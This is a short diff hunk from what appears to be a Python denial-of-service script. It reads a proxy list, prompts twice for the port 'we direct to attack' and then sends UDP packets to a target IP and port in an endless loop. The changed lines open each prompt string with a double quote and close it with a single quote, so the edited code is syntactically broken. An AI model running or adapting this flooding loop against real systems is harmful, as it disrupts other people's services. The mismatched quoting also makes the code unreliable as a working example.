@@ -339,8 +339,8 @@ proxyf = in_file.read()
 in_file.close()
 
 #Port
-port=input('Port(80) : ')#Port we direct to attack
-port=input('Port(53) : ')#Port we direct to attack
+port=input("Port ( 80 ) : ')#Port we direct to attack
+port=input("Port ( 53 ) : ')#Port we direct to attack
 
 while 1: #Infinitely loops sending packets to the port until the program is exited.
     sock.sendto(bytes,(ip,port))
